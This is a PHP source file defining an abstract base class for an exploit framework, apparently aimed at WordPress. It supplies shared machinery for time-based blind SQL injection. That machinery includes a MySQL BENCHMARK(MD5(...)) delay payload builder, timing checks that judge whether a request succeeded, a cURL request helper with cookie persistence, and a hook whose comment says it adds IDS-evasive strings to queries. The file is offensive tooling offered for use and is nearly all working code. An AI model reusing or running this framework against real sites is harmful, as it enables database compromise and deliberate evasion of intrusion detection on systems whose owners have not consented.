<?php

abstract class BaseExploit 
{
	static $verbose=false;
	static $logdir=null; //if logs are enabled
	static $benchmark=1024; //number to be used in benchmark for blind
	static $threshold=1;	//number of seconds to succeed on blind
	static $thresholdMultiplier=5;	//how many times of roundtrip should the threshold be
	static $roundtrip=1; 	//time of a single request to the host
	static $evasionFunction=null;
	/**
	 * adds IDS evasive strings, call wherever you can in the query
	 */
	protected function evasion($length=20)
	{
		if (isset(self::$evasionFunction))
			return call_user_func_array(self::$evasionFunction, array($length));
		else
			return "";
	}
	protected function fastEnough($time)
	{
		//half the threshold is slow enough, considering that threshold is 5 times the roundtrip
		return $time<self::$threshold/2+self::$roundtrip;
	}
	protected function signatureMysql()
	{
		$sig=$this->signature();
		$a=array();
		for ($i=0;$i<strlen($sig);++$i)
			$a[]=ord($sig[$i]);
		return "CONCAT(CHAR(".implode(",",$a)."),database())";
	}
	protected function signature()
	{
		return "ABIUSX";
	}
	protected function benchmark()
	{
		return "BENCHMARK(".self::$benchmark.",{$this->evasion()}MD5({$this->signatureMysql()}))";
	}
	private $timer=null;
	function timein()
	{
		$this->timer=microtime(true);
	}
	function timeout()
	{
		return microtime(true)-$this->timer;
	}
	private $cookiejar;
	function __construct()
	{
		$this->cookiejar=tempnam(sys_get_temp_dir(), 'WPBench');
	}
	protected function curl($url,$postData=null,$headers=array())
	{
		if (self::$verbose)
		{
			echo '"'.$url.'"';
			if (is_array($postData)) 
				echo " --data \"".http_build_query($postData).'"';
			elseif (is_string($postData))
				echo " --data \"{$postData}\"";

			echo PHP_EOL;
		}
	    $defaults = array( 
        	CURLOPT_HEADER => (count($headers)>=1), 
        	CURLOPT_URL => $url, 
        	CURLOPT_FRESH_CONNECT => 1, 
        	CURLOPT_RETURNTRANSFER => 1, 
        	CURLOPT_FORBID_REUSE => 1, 
        	CURLOPT_TIMEOUT => self::$roundtrip+self::$threshold*5, 
        	CURLOPT_FOLLOWLOCATION => 1,
        	CURLOPT_COOKIEJAR => $this->cookiejar,
        	CURLOPT_COOKIEFILE => $this->cookiejar
    	); 
    	if (is_array($postData))
        {
        	$defaults[CURLOPT_POSTFIELDS] = http_build_query($postData) ;
        	$defaults[CURLOPT_POST] = 1;
        }
        if (is_string($postData))
        {
        	$defaults[CURLOPT_POSTFIELDS] = ($postData) ;
        	$defaults[CURLOPT_POST] = 1;
        }
        if (is_array($headers))
        	$defaults[CURLOPT_HTTPHEADER]=$headers;
    	$ch = curl_init($url); 
    	curl_setopt_array($ch, ($defaults)); 
    	$result = curl_exec($ch);
    	curl_close($ch);
    	return $result; 
	} 
	abstract function test();
	static $url;
	static $path;
	function path()
	{
		return realpath(self::$path)."/";
	}
	function url()
	{
		return self::$url;
	}
	protected $name;
	function name()
	{
		return $this->name;
	}
}
